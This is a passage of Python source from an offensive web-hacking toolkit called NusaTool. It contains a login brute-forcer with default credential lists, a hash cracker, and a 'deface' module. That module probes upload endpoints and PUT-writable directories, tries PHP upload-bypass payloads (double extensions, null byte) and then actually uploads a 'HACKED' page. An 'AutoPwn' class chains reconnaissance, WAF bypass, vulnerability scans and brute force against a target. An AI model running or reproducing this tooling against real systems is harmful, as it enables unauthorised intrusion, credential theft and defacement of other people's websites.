        print(f"  {G}✔{N} Baseline captured!")
        print(f"      {D}Status: {Y}{self.baseline['status']}{N}  |  Size: {Y}{self.baseline['len']}B{N}")

        # Phase 2: Build credential pairs
        print(f"\n  {BOLD}{C}PHASE 2: LOADING CREDENTIALS{N}")
        creds = []
        wd = os.path.join(os.path.dirname(__file__), "wordlists")

        users = ["admin", "administrator", "root", "user", "test", "guest", "manager",
                 "operator", "supervisor", "demo", "dev", "backup", "nobody", "mail", "ftp"]

        passes = ["admin", "password", "123456", "admin123", "password123", "letmein", "qwerty",
                  "admin12345", "P@ssw0rd", "12345678", "welcome", "root123", "toor", "test",
                  "admin1", "administrator1", "passw0rd", "Passw0rd", "changeme", "secret",
                  "1234", "12345", "abc123", "monkey", "dragon", "master", "login", "summer",
                  "princess", "batman", "superman", "iloveyou", "sunshine", "trustno1",
                  "football", "baseball", "password1", "password!", "qwerty123"]

        uf = os.path.join(wd, "usernames.txt")
        pf = os.path.join(wd, "passwords.txt")
        if os.path.exists(uf):
            with open(uf) as f:
                users = [l.strip() for l in f if l.strip()]
            print(f"  {G}✔{N} Loaded {len(users)} users from wordlist")
        else:
            print(f"  {Y}⚠{N} Default {len(users)} users (place wordlists/usernames.txt for custom){N}")

        if os.path.exists(pf):
            with open(pf) as f:
                passes = [l.strip() for l in f if l.strip()]
            print(f"  {G}✔{N} Loaded {len(passes)} passwords from wordlist")
        else:
            print(f"  {Y}⚠{N} Default {len(passes)} passwords (place wordlists/passwords.txt for custom){N}")

        for u in users:
            for p in passes:
                creds.append((u, p))

        self.total = len(creds)
        print(f"  {C}◉{N} Total combos: {Y}{self.total}{N}  |  Threads: {Y}{self.threads}{N}")

        if self.total == 0:
            print(f"  {R}✘{N} No credentials to try.\n")
            return []

        # Phase 3: Brute force
        print(f"\n  {BOLD}{C}PHASE 3: BRUTE FORCING{N}")
        print(f"  {D}{'─'*50}{N}")

        q = Queue()
        for u, p in creds:
            q.put((u, p))

        self.start_time = time.time()
        for _ in range(min(self.threads, self.total)):
            t = threading.Thread(target=self._worker, args=(q,), daemon=True)
            t.start()
        q.join()
        elapsed = time.time() - self.start_time

        print(f"\n  {D}{'─'*50}{N}")
        if self.creds:
            print(f"  {R}{BOLD}⚠ {len(self.creds)} potential credential(s) found in {elapsed:.1f}s!{N}")
            print(f"  {Y}⚠{N} Please verify manually — may contain false positives{N}")
            ptable(["USERNAME", "PASSWORD"], [[c["username"], c["password"]] for c in self.creds], colors=[G] * len(self.creds))
        else:
            print(f"  {R}✘{N} No valid credentials  ({self.total} attempts in {elapsed:.1f}s)")
            print(f"      {D}Tip: add custom wordlists at wordlists/usernames.txt and wordlists/passwords.txt{N}")
        print()
        return self.creds


# ══════════════════════════════════════════════════════
#  HASH CRACKER — Offline Hash Bruteforce
# ══════════════════════════════════════════════════════

class HashCracker:
    def __init__(self, target_hash, wordlist, hash_type="auto", threads=4):
        self.target = target_hash.lower().strip()
        self.wl = wordlist
        self.hash_type = hash_type
        self.threads = min(threads, 8)
        self.found = None
        self.algorithms = {
            "md5": hashlib.md5,
            "md4": hashlib.new,
            "sha1": hashlib.sha1,
            "sha224": hashlib.sha224,
            "sha256": hashlib.sha256,
            "sha384": hashlib.sha384,
            "sha512": hashlib.sha512,
        }
        self.salt = None

    def _detect_type(self):
        h = self.target
        lh = len(h)
        if lh == 32 and all(c in "0123456789abcdef" for c in h): return "md5"
        if lh == 40 and all(c in "0123456789abcdef" for c in h): return "sha1"
        if lh == 56 and all(c in "0123456789abcdef" for c in h): return "sha224"
        if lh == 64 and all(c in "0123456789abcdef" for c in h): return "sha256"
        if lh == 96 and all(c in "0123456789abcdef" for c in h): return "sha384"
        if lh == 128 and all(c in "0123456789abcdef" for c in h): return "sha512"
        if ":" in h:
            parts = h.split(":")
            self.salt = parts[0]
            self.target = parts[1].lower()
            return self._detect_type()
        return None

    def _check(self, word):
        word = word.strip()
        if not word:
            return False
        h = self.algorithms[self.hash_type](word.encode()).hexdigest()
        if h == self.target:
            self.found = word
            return True
        if h == self.target.lower():
            self.found = word
            return True
        if self.salt:
            h2 = self.algorithms[self.hash_type]((self.salt + word).encode()).hexdigest()
            if h2 == self.target:
                self.found = word
                return True
            h3 = self.algorithms[self.hash_type]((word + self.salt).encode()).hexdigest()
            if h3 == self.target:
                self.found = word
                return True
        # Common variants
        for prefix in ["", "@", "#", "!", "123", "2023", "2024"]:
            h4 = self.algorithms[self.hash_type]((prefix + word).encode()).hexdigest()
            if h4 == self.target:
                self.found = prefix + word
                return True
        return False

    def _worker(self, q, stop):
        while not stop.is_set():
            try:
                word = q.get_nowait()
            except:
                break
            if self._check(word):
                stop.set()
            q.task_done()

    def run(self):
        header("HASH CRACKER")
        print(f"  {C}◉{N} Target Hash: {Y}{self.target}{N}")
        if self.salt:
            print(f"  {C}◉{N} Salt: {Y}{self.salt}{N}")

        detected = self._detect_type()
        if self.hash_type == "auto":
            if not detected:
                print(f"  {R}✘{N} Could not auto-detect hash type. Use --type md5|sha1|sha256|sha512\n")
                return None
            self.hash_type = detected
        elif self.hash_type not in self.algorithms:
            print(f"  {R}✘{N} Unknown hash type. Use: {', '.join(self.algorithms.keys())}\n")
            return None

        print(f"  {C}◉{N} Type: {Y}{self.hash_type.upper()}{N} | Threads: {Y}{self.threads}{N}")

        try:
            with open(self.wl, errors="ignore") as f:
                words = [l.rstrip("\n\r") for l in f]
        except:
            print(f"  {R}✘{N} Wordlist not found: {self.wl}\n")
            return None

        total = len(words)
        print(f"  {C}◉{N} Wordlist: {Y}{self.wl}{N}  ({total} words)")

        if total == 0:
            print(f"  {R}✘{N} Empty wordlist.\n")
            return None

        print(f"\n  {BOLD}{C}CRACKING IN PROGRESS...{N}")
        print(f"  {D}{'─'*50}{N}")

        q = Queue()
        for w in words:
            q.put(w)

        stop = threading.Event()
        start = time.time()
        last_update = time.time()
        done = 0

        for _ in range(min(self.threads, total)):
            t = threading.Thread(target=self._worker, args=(q, stop), daemon=True)
            t.start()

        # Progress monitor
        while not stop.is_set() and not q.empty():
            current_done = total - q.qsize()
            if current_done > done:
                done = current_done
                now = time.time()
                if now - last_update >= 0.5:
                    elapsed = now - start
                    rate = done / elapsed if elapsed > 0 else 0
                    pct = done * 100 // total
                    eta = (total - done) / rate if rate > 0 else 0
                    print(f"  {D}[{done}/{total}] {pct}% | {rate:.0f} w/s | ETA {eta:.0f}s{N}", end="\r")
                    last_update = now
            time.sleep(0.05)

        q.join()
        elapsed = time.time() - start

        print(f"\n  {D}{'─'*50}{N}")
        if self.found:
            print(f"\n  {G}{BOLD}[CRACKED!]{N} {Y}{self.target}{N} → {G}{BOLD}{self.found}{N}")
            print(f"  {D}Time: {elapsed:.1f}s{N}")
        else:
            print(f"\n  {R}[!]{N} Hash not cracked  ({total} words in {elapsed:.1f}s)")
        print()
        return self.found


# ══════════════════════════════════════════════════════
#  DEFACE TESTER — File Upload & Writeable Dir Scanner
# ══════════════════════════════════════════════════════

class DefaceTester:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/")
        self.bypass = bypass or BypassEngine(url)
        self.parsed = urlparse(self.url)
        self.vulns = []
        self.upload_endpoints = [
            "/upload", "/uploads", "/file", "/files", "/media", "/assets",
            "/admin/upload", "/admin/uploads", "/admin/file", "/admin/files",
            "/wp-content/uploads", "/wp-admin/upload", "/wp-admin/async-upload.php",
            "/upload.php", "/file.php", "/upload_file.php", "/uploadfile.php",
            "/api/upload", "/api/file", "/api/v1/upload", "/api/v1/file",
            "/editor/upload", "/ckfinder/upload", "/fckeditor/upload",
            "/images", "/img", "/storage", "/userfiles", "/uploads/images",
            "/uploadify", "/plupload", "/resize", "/thumb", "/thumbnail",
            "/_upload", "/uploader", "/upload_handler", "/Upload",
            "/admin/content", "/admin/media", "/admin/filemanager",
            "/simpla/index.php", "/backup", "/files/upload",
        ]

    def _check_upload_endpoint(self, path):
        u = urljoin(self.url, path)
        try:
            r = self.bypass.get(u, timeout=8, allow_redirects=False)
            sc = r.status_code
            if sc == 200:
                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" in ct or "application/json" in ct or sc == 200:
                    self.vulns.append({"type": "Upload Endpoint", "url": u, "status": sc, "detail": "Upload endpoint accessible"})
                    print(f"  {Y}[!]{N} {G}UPLOAD ENDPOINT{N} {u}  {D}[HTTP {sc}]{N}")
                    return True
                elif "text/plain" in ct:
                    self.vulns.append({"type": "Upload Endpoint", "url": u, "status": sc, "detail": "Upload endpoint (plain text)"})
                    print(f"  {Y}[!]{N} {Y}UPLOAD ENDPOINT{N} {u}  {D}[HTTP {sc} text/plain]{N}")
                    return True
            elif sc in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                if not loc.startswith("http") and not loc.startswith("/"):
                    self.vulns.append({"type": "Upload Endpoint", "url": u, "status": sc, "detail": f"Redirects to: {loc}"})
                    print(f"  {Y}[?]{N} {C}UPLOAD REDIRECT{N} {u} → {D}{loc}{N}")
        except: pass
        return False

    def _check_put_method(self, path):
        u = urljoin(self.url, path)
        test_file = f"nusatool_test_{random.randint(1000,9999)}.txt"
        test_content = f"NusaTool Security Test — {datetime.datetime.now()}"
        try:
            r = self.bypass.get(u + test_file, timeout=8, allow_redirects=False)
            if r.status_code not in (404,):
                return False
        except: pass
        try:
            hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list)}
            r = requests.put(u + test_file, data=test_content, headers=hdrs, timeout=8, verify=False)
            if r.status_code in (200, 201, 204):
                r2 = self.bypass.get(u + test_file, timeout=8, allow_redirects=False)
                if r2.status_code == 200 and test_content in r2.text:
                    self.vulns.append({"type": "PUT Writeable", "url": u + test_file, "status": r.status_code, "detail": "Directory is writeable via PUT"})
                    print(f"  {R}[!]{N} {BOLD}PUT WRITEABLE{N} {Y}{u}{N}")
                    print(f"      {D}Created and verified: {test_file}{N}")
                    return True
        except requests.RequestException as e:
            print(f"  {D}  PUT failed: {e}{N}")
        except: pass
        return False

    def _check_fileupload_form(self):
        try:
            r = self.bypass.get(self.url, timeout=10)
            forms_found = 0
            upload_forms = 0
            i = 0
            while True:
                fs = r.text.find("<form", i)
                if fs == -1: break
                fe = r.text.find("</form>", fs)
                if fe == -1: break
                form = r.text[fs:fe+7]
                forms_found += 1
                if 'enctype="multipart/form-data"' in form or "type='file'" in form or 'type="file"' in form or 'type=file' in form:
                    upload_forms += 1
                    inp_names = set()
                    for m in re.finditer(r'name=["\']([^"\']+)["\']', form):
                        inp_names.add(m.group(1))
                    action = ""
                    am = re.search(r'action=["\']([^"\']+)["\']', form[:300])
                    if am: action = am.group(1)
                    self.vulns.append({"type": "Upload Form", "url": self.url, "detail": f"Form action: {action}, fields: {', '.join(inp_names)}"})
                    print(f"  {Y}[!]{N} {C}FILE UPLOAD FORM{N}  action={D}{action[:50]}{N}  fields={inp_names}")
                i = fe + 7
            if forms_found == 0:
                print(f"  {D}[−]{N} No forms found on page")
            elif upload_forms == 0:
                print(f"  {G}[✔]{N} No file upload forms detected  {D}({forms_found} form(s) found){N}")
            else:
                print(f"      {Y}{upload_forms} upload form(s) out of {forms_found} total{N}")
            return upload_forms
        except Exception as e:
            print(f"  {R}✘{N} Form scan error: {e}")
            return 0

    def _check_directory_listing(self, path):
        u = urljoin(self.url, path)
        try:
            r = self.bypass.get(u, timeout=8)
            if r.status_code == 200:
                indicators = ["Index of /", "<title>Index of", "Parent Directory</a>", "<a href=\"?C=", "Directory listing for"]
                if any(ind in r.text for ind in indicators):
                    self.vulns.append({"type": "Directory Listing", "url": u, "status": 200, "detail": "Directory listing enabled"})
                    print(f"  {Y}[!]{N} {R}DIR LISTING{N} {u}")
                    return True
        except: pass
        return False

    def _test_upload_bypass(self, path):
        u = urljoin(self.url, path)
        test_name = f"nusatool_{random.randint(10000,99999)}"
        payloads = [
            (f"{test_name}.php", "<?php echo 'nusatool_test'; ?>", "PHP"),
            (f"{test_name}.php5", "<?php echo 'nusatool_test'; ?>", "PHP5"),
            (f"{test_name}.phtml", "<?php echo 'nusatool_test'; ?>", "PHTML"),
            (f"{test_name}.php.jpg", "<?php echo 'nusatool_test'; ?>", "PHP double ext"),
            (f"{test_name}.jpg", "<?php echo 'nusatool_test'; ?>", "JPG with PHP"),
            (f"{test_name}.php%00.jpg", "<?php echo 'nusatool_test'; ?>", "Null byte"),
            (f"{test_name}.html", "<html><h1>NusaTool</h1></html>", "HTML upload"),
        ]
        for fname, content, label in payloads:
            try:
                files = {"file": (fname, content, "application/octet-stream")}
                r = requests.post(u, files=files, timeout=10, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code in (200, 201, 204):
                    verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                    r2 = requests.get(verify_url, timeout=8, verify=False)
                    if r2.status_code == 200:
                        self.vulns.append({"type": f"Upload Bypass ({label})", "url": verify_url, "status": r.status_code, "detail": f"Uploaded {fname} is accessible"})
                        print(f"  {R}[!]{N} {BOLD}UPLOAD BYPASS{N} {Y}{label}{N}")
                        print(f"      {D}→ {verify_url}{N}")
                        return True
            except: pass
        return False

    def scan(self):
        header("DEFACE TESTER — UPLOAD & WRITEABLE SCANNER")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
            return []

        upload_endpoints = []
        writeable_dirs = []
        dir_listings = []

        print(f"\n  {BOLD}{C}PHASE 1: UPLOAD ENDPOINTS{N}  ({len(self.upload_endpoints)} paths)")
        for ep in self.upload_endpoints:
            if self._check_upload_endpoint(ep):
                upload_endpoints.append(ep)

        print(f"\n  {BOLD}{C}PHASE 2: FILE UPLOAD FORMS{N}")
        self._check_fileupload_form()

        print(f"\n  {BOLD}{C}PHASE 3: PUT METHOD CHECK{N}")
        put_dirs = ["/", "/uploads/", "/images/", "/assets/", "/files/", "/media/", "/tmp/"]
        for d in put_dirs:
            if self._check_put_method(d):
                writeable_dirs.append(d)
                break

        print(f"\n  {BOLD}{C}PHASE 4: DIRECTORY LISTING{N}")
        listing_dirs = ["/uploads/", "/images/", "/assets/", "/files/", "/media/", "/backup/", "/tmp/", "/admin/"]
        for d in listing_dirs:
            if self._check_directory_listing(d):
                dir_listings.append(d)

        if upload_endpoints:
            print(f"\n  {BOLD}{C}PHASE 5: UPLOAD BYPASS ATTEMPTS{N}")
            for ep in upload_endpoints[:3]:
                self._test_upload_bypass(ep)

        print(f"\n  {D}{'─'*50}{N}")
        total = len(self.vulns)
        if total:
            print(f"  {R}{BOLD}⚠ {total} potential deface vector(s) found!{N}")
            ptable(["#", "TYPE", "URL", "STATUS"],
                   [[str(i+1), v["type"], v["url"][:55], str(v.get("status","?"))] for i, v in enumerate(self.vulns)],
                   colors=[R if "Writeable" in v["type"] or "Bypass" in v["type"] else Y for v in self.vulns])
        else:
            print(f"  {G}✔{N} No deface vectors detected.")
        print()
        return self.vulns

    def deface(self, filepath=None, content=None):
        """Scan + actual upload of deface content."""
        if not filepath and not content:
            content = f"""<!DOCTYPE html><html><head><title>Hacked</title><style>
body {{ background:#000; color:#0f0; text-align:center; padding-top:20vh; font-family:monospace; }}
h1 {{ font-size:4em; }} blink {{ font-size:1.5em; }}</style></head>
<body><h1>🔥 HACKED 🔥</h1><blink>NusaTool Security Assessment</blink>
<p style='color:#888;margin-top:3em'>This site has been defaced for security demonstration</p>
<p style='color:#555'>Contact: security@nusatool.local</p></body></html>"""

        if filepath and not content:
            try:
                with open(filepath, errors='replace') as f:
                    content = f.read()
            except Exception as e:
                print(f"  {R}✘{N} Failed to read file: {e}")
                return []

        header("DEFACE — ACTIVE DEPLOYMENT")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {C}◉{N} Size : {Y}{len(content)}B{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n")
            return []

        self.scan()
        if not self.vulns:
            print(f"  {R}✘{N} No vectors found — cannot deface.\n")
            return []

        fname = f"nusadeface_{random.randint(10000,99999)}.html"
        uploaded = []

        # 1) PUT method — langsung upload ke direktori writeable
        for v in self.vulns:
            if "PUT Writeable" in v["type"]:
                base_dir = v["url"].rsplit("/", 1)[0] + "/" if "/" in v["url"] else "/"
                target = base_dir + fname
                try:
                    hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list), "Content-Type": "text/html"}
                    r = requests.put(target, data=content, headers=hdrs, timeout=10, verify=False)
                    if r.status_code in (200, 201, 204):
                        r2 = self.bypass.get(target, timeout=8)
                        if r2.status_code == 200 and len(r2.text) > 50:
                            print(f"  {G}[✔]{N} {BOLD}PUT SUCCESS{N} {Y}{target}{N}")
                            uploaded.append({"method": "PUT", "url": target})
                except Exception as e:
                    print(f"  {R}[✘]{N} PUT failed: {e}")

        # 2) Upload endpoint — POST multipart
        for v in self.vulns:
            if "Upload Endpoint" in v["type"]:
                ep_url = v["url"]
                try:
                    files = {"file": (fname, content, "text/html")}
                    r = requests.post(ep_url, files=files, timeout=10, verify=False,
                        headers={"User-Agent": random.choice(self.bypass.ua_list)})
                    if r.status_code in (200, 201, 204):
                        verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                        r2 = requests.get(verify_url, timeout=8, verify=False)
                        if r2.status_code == 200 and len(r2.text) > 50:
                            print(f"  {G}[✔]{N} {BOLD}POST UPLOAD{N} {Y}{verify_url}{N}")
                            uploaded.append({"method": "POST", "url": verify_url})
                except Exception as e:
                    print(f"  {R}[✘]{N} POST upload failed: {e}")

        # 3) Upload bypass — re-use same technique
        for v in self.vulns:
            if "Upload Bypass" in v["type"]:
                ep_url = v["url"]
                base = ep_url.rsplit("/", 1)[0]
                if not base.startswith("http"):
                    continue
                try:
                    files = {"file": (fname, content, "image/jpeg")}
                    r = requests.post(base + "/", files=files, timeout=10, verify=False,
                        headers={"User-Agent": random.choice(self.bypass.ua_list)})
                    if r.status_code in (200, 201, 204):
                        verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                        r2 = requests.get(verify_url, timeout=8, verify=False)
                        if r2.status_code == 200 and len(r2.text) > 50:
                            print(f"  {G}[✔]{N} {BOLD}BYPASS UPLOAD{N} {Y}{verify_url}{N}")
                            uploaded.append({"method": "BYPASS", "url": verify_url})
                except Exception as e:
                    print(f"  {R}[✘]{N} Bypass upload failed: {e}")

        print(f"\n  {D}{'─'*50}{N}")
        if uploaded:
            print(f"  {G}{BOLD}✔ {len(uploaded)} file(s) deployed!{N}")
            ptable(["METHOD", "URL"], [[u["method"], u["url"]] for u in uploaded], colors=[G]*len(uploaded))
        else:
            print(f"  {R}✘{N} Could not upload deface content.")
        print()
        return uploaded


# ══════════════════════════════════════════════════════
#  REPORT GENERATOR (JSON + HTML)
# ══════════════════════════════════════════════════════

class ReportGenerator:
    def generate_json(self, data, f="nusatool_report.json"):
        with open(f, "w") as fp: json.dump(data, fp, indent=2, default=str)
        print(f"  {G}✔{N} JSON report saved to {Y}{f}{N}")

    def generate_html(self, f="nusatool_report.html", data=None):
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        findings = ""
        if data and data.get("vulns"):
            for i, v in enumerate(data["vulns"], 1):
                findings += f"<tr><td>{i}</td><td>{escape(v.get('type','?'))}</td><td>{escape(v.get('param','?'))}</td><td>{escape(v.get('payload','')[:40])}</td><td><span class='badge badge-high'>High</span></td></tr>\n"
        html = f"""<!DOCTYPE html><html lang="en">
<head><meta charset="UTF-8"><title>NusaTool Report</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0}}
.container{{max-width:1100px;margin:0 auto;padding:20px}}
.hdr{{background:linear-gradient(135deg,#1a1f3a,#0d1b2a);padding:40px;border-radius:10px;text-align:center;border:1px solid #2a3f5f}}
.hdr h1{{color:#00d4ff;font-size:2.5em}}.hdr p{{color:#8899aa}}
.section{{background:#111827;border:1px solid #1e293b;border-radius:10px;padding:25px;margin:20px 0}}
.section h2{{color:#00d4ff;border-bottom:1px solid #1e293b;padding-bottom:10px}}
table{{width:100%;border-collapse:collapse;margin-top:15px}}
th{{background:#1a1f3a;color:#00d4ff;padding:12px;text-align:left}}
td{{padding:10px 12px;border-bottom:1px solid #1e293b}}
.badge{{display:inline-block;padding:3px 10px;border-radius:12px;font-size:.85em}}
.badge-high{{background:#ff4444;color:#fff}}
.badge-med{{background:#ffaa00;color:#1a1f3a}}
.badge-low{{background:#00aa44;color:#fff}}
.footer{{text-align:center;padding:30px;color:#556;font-size:.85em}}
pre{{background:#1a1f3a;padding:15px;border-radius:6px;overflow-x:auto;color:#00d4ff}}</style></head>
<body><div class="container">
<div class="hdr"><h1>NusaTool</h1><p>Hack Audit Report</p><p style="font-size:.9em;margin-top:10px">{ts}</p></div>
<div class="section"><h2>Summary</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-top:15px">
<div style="background:#1a1f3a;padding:12px;border-radius:6px"><div style="color:#8899aa">Tool</div><div style="font-weight:600">NusaTool v{VERSION}</div></div>
<div style="background:#1a1f3a;padding:12px;border-radius:6px"><div style="color:#8899aa">Date</div><div style="font-weight:600">{ts}</div></div>
</div></div>
<div class="section"><h2>Vulnerabilities</h2>
<table><thead><tr><th>#</th><th>Type</th><th>Parameter</th><th>Payload</th><th>Severity</th></tr></thead>
<tbody>{findings or '<tr><td colspan="5" style="text-align:center;color:#8899aa">No vulnerabilities found</td></tr>'}</tbody></table></div>
<div class="section"><h2>Modules</h2><table><thead><tr><th>Module</th><th>Description</th><th>Risk</th></tr></thead><tbody>
<tr><td>AutoPwn</td><td>Automated full pentest (6 phases)</td><td><span class="badge badge-high">High</span></td></tr>
<tr><td>URL Scanner</td><td>XSS, SQLi, LFI, Redirect, CMDi, SSTI</td><td><span class="badge badge-high">High</span></td></tr>
<tr><td>CORS Scanner</td><td>Cross-Origin misconfiguration</td><td><span class="badge badge-med">Medium</span></td></tr>
<tr><td>CSRF Scanner</td><td>Missing CSRF tokens</td><td><span class="badge badge-med">Medium</span></td></tr>
<tr><td>CVE Checker</td><td>Known vulnerability database</td><td><span class="badge badge-high">High</span></td></tr>
<tr><td>WAF Bypass</td><td>12+ bypass techniques</td><td><span class="badge badge-med">Medium</span></td></tr>
</tbody></table></div>
<div class="footer">NusaTool v{VERSION} | Generated automatically</div>
</div></body></html>"""
        with open(f, "w") as fp: fp.write(html)
        print(f"  {G}✔{N} HTML report saved to {Y}{f}{N}")

    def generate(self, f="nusatool_report.html", data=None):
        return self.generate_html(f, data)


# ══════════════════════════════════════════════════════
#  AUTOPWN — FULL AUTO HACK (8 phases)
# ══════════════════════════════════════════════════════

class AutoPwn:
    def __init__(self, target, wordlist_dir=None, ports="1-1024", threads=20):
        self.target = target; self.ports = ports; self.threads = threads
        self.wd = wordlist_dir or os.path.join(os.path.dirname(__file__), "wordlists")
        self.domain = None; self.base_url = None
        self.results = {"recon": {}, "network": {}, "web_vulns": [], "cors": [], "csrf": [], "cve": [], "dirs": [], "creds": []}
        self.all_vulns = []; self.banners = []; self.bypass = None; self.t0 = time.time()
        if self.target.startswith("http"):
            self.base_url = self.target.rstrip("/")
            self.domain = urlparse(self.target).netloc.split(":")[0]
        else:
            self.domain = self.target; self.base_url = f"http://{self.target}"

    def _elapsed(self): return f"{time.time()-self.t0:.1f}s"

    def run(self):
        header("AUTOPWN v2 — 8-PHASE AUTO PENTEST")
        print(f"  {C}◉{N} Target: {Y}{self.target}{N}  |  Domain: {Y}{self.domain}{N}  |  URL: {Y}{self.base_url}{N}")
        print(f"  {D}{'─'*50}{N}")

        # PHASE 1: RECON
        print(f"\n  {BOLD}{R}╔═══ PHASE 1: RECON (whois → dns → subdomain) ═══╗{N}")
        try: WhoisLookup(self.domain).run()
        except: pass
        try: self.results["recon"]["dns"] = DNSRecon(self.domain).run()
        except: pass
        try:
            wl = os.path.join(self.wd,"subdomains.txt")
            self.results["recon"]["subdomains"] = SubdomainEnumerator(self.domain, wl if os.path.exists(wl) else None, self.threads).run()
        except: pass

        # PHASE 2: WAF BYPASS
        print(f"\n  {BOLD}{R}╔═══ PHASE 2: WAF DETECTION ═══════════════════════════╗{N}")
        self.bypass = BypassEngine(self.base_url)
        print(f"  {self.bypass.info()}{N}")

        # PHASE 3: NETWORK
        print(f"\n  {BOLD}{R}╔═══ PHASE 3: NETWORK (portscan → service) ═══════════╗{N}")
        try:
            if not self.target.startswith("http"):
                self.results["network"]["ports"] = PortScanner(self.domain, self.ports).run()
                if self.results["network"]["ports"]:
                    ps = ",".join(str(p) for p,_ in self.results["network"]["ports"])
                    self.results["network"]["services"] = ServiceDetector(self.domain, ps).run()
                    self.banners = self.results["network"]["services"]
        except: pass

        # PHASE 4: CVE CHECK
        print(f"\n  {BOLD}{R}╔═══ PHASE 4: CVE CHECKER ══════════════════════════════╗{N}")
        try:
            checker = CVEChecker()
            self.results["cve"] = checker.scan_from_banners(self.banners)
            for v in self.results["cve"]:
                self.all_vulns.append({"type": "CVE", "param": v["service"], "payload": v["cve"], "severity": v["severity"]})
        except: pass

        # PHASE 5: URL VULN SCAN
        print(f"\n  {BOLD}{R}╔═══ PHASE 5: WEB VULNS (urlscan → xss → sqli) ════════╗{N}")
        try:
            self.results["web_vulns"] = URLScanner(self.base_url, self.bypass).scan()
            self.all_vulns.extend(self.results["web_vulns"])
        except: pass
        try:
            for v in XSSScanner(self.base_url, "GET", None, self.bypass).run():
                self.all_vulns.append({"type":"XSS","param":v["parameter"],"payload":v["payload"]})
        except: pass
        try:
            for v in SQLiScanner(self.base_url, "GET", None, self.bypass).run():
                self.all_vulns.append({"type":"SQLi","param":v["parameter"],"payload":v["payload"]})
        except: pass

        # PHASE 6: CORS + CSRF
        print(f"\n  {BOLD}{R}╔═══ PHASE 6: CORS + CSRF ════════════════════════════════╗{N}")
        try:
            self.results["cors"] = CORSScanner(self.base_url, self.bypass).scan()
            self.all_vulns.extend({"type":"CORS","param":v["origin"],"payload":v["issue"]} for v in self.results["cors"])
        except: pass
        try:
            self.results["csrf"] = CSRFScanner(self.base_url, self.bypass).scan()
            self.all_vulns.extend({"type":"CSRF","param":f"Form #{v['form']}","payload":v["issue"]} for v in self.results["csrf"])
        except: pass

        # PHASE 7: DIR BUST
        print(f"\n  {BOLD}{R}╔═══ PHASE 7: DIRECTORY BUSTING ══════════════════════════╗{N}")
        try:
            wl = os.path.join(self.wd,"common.txt")
            if os.path.exists(wl):
                self.results["dirs"] = DirBruteforcer(self.base_url, wl, None, self.threads, self.bypass).run()
        except: pass

        # PHASE 8: BRUTE FORCE (if login detected)
        uf = os.path.join(self.wd,"usernames.txt")
        pf = os.path.join(self.wd,"passwords.txt")
        if os.path.exists(uf) and os.path.exists(pf) and "login" in self.base_url.lower():
            print(f"\n  {BOLD}{R}╔═══ PHASE 8: BRUTE FORCE ═══════════════════════════════╗{N}")
            try: self.results["creds"] = LoginBruteforcer(self.base_url, uf, pf, bypass=self.bypass).run()
            except: pass

        # SUMMARY
        elapsed = time.time() - self.t0
        print(f"\n  {BOLD}{R}{'═'*55}{N}")
        print(f"  {BOLD}{R}  AUTOPWN COMPLETE  ({elapsed:.1f}s){N}")
        print(f"  {BOLD}{R}{'═'*55}{N}")
        if self.all_vulns:
            print(f"\n  {R}◉{N} Vulnerabilities: {BOLD}{R}{len(self.all_vulns)}{N}")
            for v in self.all_vulns[:20]:
                print(f"    {R}[!]{N} {Y}{v.get('type','?')}{N}  {D}→ {v.get('param','?')}{N}")
            if len(self.all_vulns) > 20: print(f"    {D}... and {len(self.all_vulns)-20} more{N}")
        else: print(f"\n  {G}◉{N} Vulnerabilities: {G}None{N}")
        print(f"  {G}◉{N} Open ports : {len(self.results.get('network',{}).get('ports',[]))}")
        print(f"  {C}◉{N} Subdomains : {len(self.results.get('recon',{}).get('subdomains',[]))}")
        print(f"  {M}◉{N} Dirs found : {len(self.results.get('dirs',[]))}")

        # Auto export
        ReportGenerator().generate_html("autopwn_report.html", {"vulns": self.all_vulns})
        ReportGenerator().generate_json({"results": self.results, "vulns": self.all_vulns, "elapsed": elapsed}, "autopwn_report.json")
        print()


# ══════════════════════════════════════════════════════
#  INTERACTIVE CLI
# ══════════════════════════════════════════════════════

class NusaCLI:
    def __init__(self):
        self.running = True
    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    def banner(self):
        self.clear(); print(BANNER)
        print(f"  {D}{'═'*58}{N}")
        print(f"  {C}{BOLD}◈{N}  {W}help{N}{D} for commands  |  {W}v{C}{VERSION}{N}  |  {R}AutoPwn{N}  {Y}Deface{N}  {M}Hash{N}  {C}Crack{N}  {G}Brute{N}")
        print(f"  {D}{'═'*58}{N}\n")
    def prompt(self):
        return f"  {R}{BOLD}▶{N} {C}NusaTool{N} {R}{BOLD}❯{N} "
    def run(self):
        self.banner()
        while self.running:
            try:
                l = input(self.prompt()).strip()
                if not l: continue
                parts = l.split(); cmd = parts[0].lower(); args = parts[1:]
                if cmd in ("exit","quit","q"): print(f"\n  {Y}👋 Goodbye!{N}\n"); self.running = False
                elif cmd == "help": self._help()
                elif cmd == "clear": self.banner()
                elif cmd == "banner": print(BANNER)
                elif cmd == "version": print(f"\n  {C}NusaTool{N} {W}v{VERSION}{N}\n")
                else: self._exec(cmd, args)
            except (KeyboardInterrupt, EOFError): print(f"\n\n  {Y}👋 Goodbye!{N}\n"); self.running = False
    def _help(self):
        print(f"""
  {C}╔═══════════════════════════════════════════════╗{N}
  {C}║           {W}NUSA HACK TOOL {D}— {W}COMMANDS          {C}║{N}
  {C}╚═══════════════════════════════════════════════╝{N}

